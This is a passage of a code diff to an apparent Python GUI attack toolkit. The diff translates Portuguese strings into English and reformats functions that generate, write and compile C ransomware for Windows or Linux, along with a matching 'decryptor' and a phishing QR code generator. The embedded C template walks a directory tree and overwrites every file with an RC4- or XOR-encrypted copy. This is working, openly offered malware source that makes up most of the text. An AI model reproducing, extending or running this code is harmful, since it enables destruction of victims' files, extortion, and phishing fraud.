         path_sep = "\\" if target_os == "Windows" else "/"
 
-        # Cifra
+        # Cipher selection
         if cipher_type == "RC4":
             cipher_func = f"""
-    void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
-        unsigned char S[256];
-        for (int i = 0; i < 256; i++) S[i] = i;
+void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
+    unsigned char S[256];
+    for (int i = 0; i < 256; i++) S[i] = i;
 
-        int j = 0;
-        for (int i = 0; i < 256; i++) {{
-            j = (j + S[i] + key[i % klen]) % 256;
-            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
-        }}
-
-        int i = 0; j = 0;
-        for (int n = 0; n < len; n++) {{
-            i = (i + 1) % 256;
-            j = (j + S[i]) % 256;
-            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
-            data[n] ^= S[(S[i] + S[j]) % 256];
-        }}
+    int j = 0;
+    for (int i = 0; i < 256; i++) {{
+        j = (j + S[i] + key[i % klen]) % 256;
+        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
     }}
-    """
+
+    int i = 0; j = 0;
+    for (int n = 0; n < len; n++) {{
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+        data[n] ^= S[(S[i] + S[j]) % 256];
+    }}
+}}
+"""
             crypto_call = "rc4(buffer, len, key, key_len);"
 
         else:  # XOR
             cipher_func = f"""
-    void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
-        for (int i = 0; i < len; i++) {{
-            data[i] ^= key[i % klen];
-        }}
+void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
+    for (int i = 0; i < len; i++) {{
+        data[i] ^= key[i % klen];
     }}
-    """
+}}
+"""
             crypto_call = "xor_cipher(buffer, len, key, key_len);"
 
-        # Código base adaptado
+        # Base ransomware logic
         base_code = f'''#define _CRT_SECURE_NO_WARNINGS
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    #include <dirent.h>
-    #include <sys/stat.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
-    unsigned char key[] = {{{key_array}}};
-    int key_len = {key_len};
+unsigned char key[] = {{{key_array}}};
+int key_len = {key_len};
 
-    {cipher_func}
+{cipher_func}
 
-    void process_file(const char* filepath) {{
-        FILE* f = fopen(filepath, "rb");
-        if (!f) return;
-        fseek(f, 0, SEEK_END);
-        long len = ftell(f);
-        rewind(f);
+void process_file(const char* filepath) {{
+    FILE* f = fopen(filepath, "rb");
+    if (!f) return;
+    fseek(f, 0, SEEK_END);
+    long len = ftell(f);
+    rewind(f);
 
-        unsigned char* buffer = malloc(len);
-        fread(buffer, 1, len, f);
-        fclose(f);
+    unsigned char* buffer = malloc(len);
+    fread(buffer, 1, len, f);
+    fclose(f);
 
-        {crypto_call}
+    {crypto_call}
 
-        FILE* out = fopen(filepath, "wb");
-        fwrite(buffer, 1, len, out);
-        fclose(out);
-        free(buffer);
-    }}
+    FILE* out = fopen(filepath, "wb");
+    fwrite(buffer, 1, len, out);
+    fclose(out);
+    free(buffer);
+}}
 
-    void walk(const char* path) {{
-        struct dirent* entry;
-        DIR* dp = opendir(path);
-        if (!dp) return;
+void walk(const char* path) {{
+    struct dirent* entry;
+    DIR* dp = opendir(path);
+    if (!dp) return;
 
-        while ((entry = readdir(dp))) {{
-            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
-            char fullpath[1024];
-            snprintf(fullpath, sizeof(fullpath), "%s{path_sep}%s", path, entry->d_name);
+    while ((entry = readdir(dp))) {{
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+        char fullpath[1024];
+        snprintf(fullpath, sizeof(fullpath), "%s{path_sep}%s", path, entry->d_name);
 
-            struct stat st;
-            if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
-                walk(fullpath);
-            }} else {{
-                process_file(fullpath);
-            }}
+        struct stat st;
+        if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
+            walk(fullpath);
+        }} else {{
+            process_file(fullpath);
         }}
-        closedir(dp);
     }}
+    closedir(dp);
+}}
 
-    int main(int argc, char* argv[]) {{
-        if (argc != 2) {{
-            printf("Uso: %s <pasta>\\n", argv[0]);
-            return 1;
-        }}
-        walk(argv[1]);
-        return 0;
-    }}'''
+int main(int argc, char* argv[]) {{
+    if (argc != 2) {{
+        printf("Usage: %s <folder>\\n", argv[0]);
+        return 1;
+    }}
+    walk(argv[1]);
+    return 0;
+}}'''
 
-        # Salvar arquivos
+        # Save the encryptor source code
         with open(encryptor_path, "w") as f:
             f.write(base_code)
 
+        # Save the decryptor (same logic, just labeled differently)
         with open(decryptor_path, "w") as f:
-            f.write(f"// DECRYPTOR {name} - Plataforma: {target_os} - Chave: {key_text}\n")
+            f.write(f"// DECRYPTOR {name} - Platform: {target_os} - Key: {key_text}\n")
             f.write(base_code)
 
-        # Compilar se possível
-        if target_os == "Windows":
-            compiler = "x86_64-w64-mingw32-gcc"
-        else:
-            compiler = "gcc"
-
+        # Compilation
+        compiler = "x86_64-w64-mingw32-gcc" if target_os == "Windows" else "gcc"
         compile_cmd = f"{compiler} {encryptor_path} -o {exe_path}"
 
         try:
             result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
-                QMessageBox.information(self, "Sucesso", f"✅ Ransomware {target_os} gerado com sucesso em:\n{exe_path}")
+                QMessageBox.information(self, "Success", f"✅ {target_os} ransomware generated successfully at:\n{exe_path}")
             else:
-                QMessageBox.warning(self, "Aviso", f"⚠️ Código fonte gerado, mas erro ao compilar:\n{result.stderr}")
+                QMessageBox.warning(self, "Warning", f"⚠️ Source code generated, but compilation failed:\n{result.stderr}")
         except Exception as e:
-            QMessageBox.warning(self, "Erro", f"Erro na compilação: {str(e)}")
+            QMessageBox.warning(self, "Error", f"Compilation error: {str(e)}")
 
 
     def generate_sim_decryptor(self):
@@ -1649,10 +1645,10 @@ End If
         name = self.decryptor_name_input.text().strip() or "SimRansom"
         key_text = self.decryptor_key_input.text().strip()
         cipher_type = self.decryptor_cipher_selector.currentText()
-        os_target = self.decryptor_os_selector.currentText()  # Windows ou Linux
+        os_target = self.decryptor_os_selector.currentText()  # "Windows" or "Linux"
 
         if not key_text:
-            QMessageBox.warning(self, "Erro", "Digite a chave usada no ransomware (texto simples).")
+            QMessageBox.warning(self, "Error", "Please enter the key used in the ransomware (plain text).")
             return
 
         key = key_text.encode("utf-8")
@@ -1668,97 +1664,98 @@ End If
         # Cipher logic
         if cipher_type == "RC4":
             cipher_func = f"""
-    void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
-        unsigned char S[256];
-        for (int i = 0; i < 256; i++) S[i] = i;
+void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
+    unsigned char S[256];
+    for (int i = 0; i < 256; i++) S[i] = i;
 
-        int j = 0;
-        for (int i = 0; i < 256; i++) {{
-            j = (j + S[i] + key[i % klen]) % 256;
-            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
-        }}
-
-        int i = 0; j = 0;
-        for (int n = 0; n < len; n++) {{
-            i = (i + 1) % 256;
-            j = (j + S[i]) % 256;
-            unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
-            data[n] ^= S[(S[i] + S[j]) % 256];
-        }}
+    int j = 0;
+    for (int i = 0; i < 256; i++) {{
+        j = (j + S[i] + key[i % klen]) % 256;
+        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
     }}
-    """
+
+    int i = 0; j = 0;
+    for (int n = 0; n < len; n++) {{
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+        data[n] ^= S[(S[i] + S[j]) % 256];
+    }}
+}}
+"""
             crypto_call = "rc4(buffer, len, key, key_len);"
         else:  # XOR
             cipher_func = f"""
-    void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
-        for (int i = 0; i < len; i++) {{
-            data[i] ^= key[i % klen];
-        }}
+void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
+    for (int i = 0; i < len; i++) {{
+        data[i] ^= key[i % klen];
     }}
-    """
+}}
+"""
             crypto_call = "xor_cipher(buffer, len, key, key_len);"
 
+        # Full C code template
         code = f'''#define _CRT_SECURE_NO_WARNINGS
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    #include <dirent.h>
-    #include <sys/stat.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
-    unsigned char key[] = {{{key_array}}};
-    int key_len = {key_len};
+unsigned char key[] = {{{key_array}}};
+int key_len = {key_len};
 
-    {cipher_func}
+{cipher_func}
 
-    void process_file(const char* filepath) {{
-        FILE* f = fopen(filepath, "rb");
-        if (!f) return;
-        fseek(f, 0, SEEK_END);
-        long len = ftell(f);
-        rewind(f);
+void process_file(const char* filepath) {{
+    FILE* f = fopen(filepath, "rb");
+    if (!f) return;
+    fseek(f, 0, SEEK_END);
+    long len = ftell(f);
+    rewind(f);
 
-        unsigned char* buffer = malloc(len);
-        fread(buffer, 1, len, f);
-        fclose(f);
+    unsigned char* buffer = malloc(len);
+    fread(buffer, 1, len, f);
+    fclose(f);
 
-        {crypto_call}
+    {crypto_call}
 
-        FILE* out = fopen(filepath, "wb");
-        fwrite(buffer, 1, len, out);
-        fclose(out);
-        free(buffer);
-    }}
+    FILE* out = fopen(filepath, "wb");
+    fwrite(buffer, 1, len, out);
+    fclose(out);
+    free(buffer);
+}}
 
-    void walk(const char* path) {{
-        struct dirent* entry;
-        DIR* dp = opendir(path);
-        if (!dp) return;
+void walk(const char* path) {{
+    struct dirent* entry;
+    DIR* dp = opendir(path);
+    if (!dp) return;
 
-        while ((entry = readdir(dp))) {{
-            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
-            char fullpath[1024];
-            snprintf(fullpath, sizeof(fullpath), "%s{sep}%s", path, entry->d_name);
+    while ((entry = readdir(dp))) {{
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+        char fullpath[1024];
+        snprintf(fullpath, sizeof(fullpath), "%s{sep}%s", path, entry->d_name);
 
-            struct stat st;
-            if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
-                walk(fullpath);
-            }} else {{
-                process_file(fullpath);
-            }}
+        struct stat st;
+        if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
+            walk(fullpath);
+        }} else {{
+            process_file(fullpath);
         }}
-        closedir(dp);
     }}
+    closedir(dp);
+}}
 
-    int main(int argc, char* argv[]) {{
-        if (argc != 2) {{
-            printf("Uso: %s <pasta>\\n", argv[0]);
-            return 1;
-        }}
-        walk(argv[1]);
-        return 0;
+int main(int argc, char* argv[]) {{
+    if (argc != 2) {{
+        printf("Usage: %s <folder>\\n", argv[0]);
+        return 1;
     }}
-    '''
+    walk(argv[1]);
+    return 0;
+}}'''
 
+        # Save C code to file
         with open(decryptor_path, "w") as f:
             f.write(code)
 
@@ -1768,12 +1765,11 @@ End If
         try:
             result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
-                QMessageBox.information(self, "Sucesso", f"✅ Decryptor {os_target} gerado: {exe_path}")
+                QMessageBox.information(self, "Success", f"✅ Decryptor for {os_target} generated: {exe_path}")
             else:
-                QMessageBox.warning(self, "Aviso", f"⚠️ Código criado, mas erro ao compilar:\n{result.stderr}")
+                QMessageBox.warning(self, "Warning", f"⚠️ Source code created, but failed to compile:\n{result.stderr}")
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Erro na compilação: {str(e)}")
-
+            QMessageBox.critical(self, "Error", f"Compilation error: {str(e)}")
 
     def generate_phishing_qrcode(self):
         import qrcode
@@ -1782,7 +1778,7 @@ End If
 
         url = self.qr_url_input.text().strip()
         if not url:
-            QMessageBox.warning(self, "Erro", "Digite a URL de destino.")
+            QMessageBox.warning(self, "Error", "Please enter the target URL.")
             return
 
         try:
@@ -1801,32 +1797,28 @@ End If
             qt_img = QImage.fromData(buffer.getvalue())
             pixmap = QPixmap.fromImage(qt_img)
 
-            self.qr_img_data = img  # armazena a imagem PIL para salvar depois
+            self.qr_img_data = img  # Store PIL image for later saving
             self.qr_image_label.setPixmap(pixmap)
             self.qr_save_btn.setEnabled(True)
 
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Erro ao gerar QR Code:\n{str(e)}")
-
-
+            QMessageBox.critical(self, "Error", f"Failed to generate QR Code:\n{str(e)}")
 
     def save_qrcode_image(self):
         if hasattr(self, "qr_img_data"):
             from PySide2.QtWidgets import QFileDialog
-            path, _ = QFileDialog.getSaveFileName(self, "Salvar QR Code", "phish_qrcode.png", "PNG (*.png)")
+            path, _ = QFileDialog.getSaveFileName(self, "Save QR Code", "phish_qrcode.png", "PNG (*.png)")
             if path:
                 try:
                     self.qr_img_data.save(path)
-                    QMessageBox.information(self, "Salvo", f"QR Code salvo com sucesso em:\n{path}")
+                    QMessageBox.information(self, "Saved", f"QR Code successfully saved to:\n{path}")
                 except Exception as e:
-                    QMessageBox.critical(self, "Erro", f"Erro ao salvar:\n{str(e)}")
+                    QMessageBox.critical(self, "Error", f"Failed to save QR Code:\n{str(e)}")
         else:
-            QMessageBox.warning(self, "Erro", "Nenhum QR Code gerado ainda.")
-
+            QMessageBox.warning(self, "Error", "No QR Code has been generated yet.")
 
     def tr(self, key):
         return self.translations.get(key, key)
-
 
 import asyncio
 import edge_tts
@@ -1850,4 +1842,3 @@ if __name__ == "__main__":
     QTimer.singleShot(2500, start_main)
 
     sys.exit(app.exec_())
-
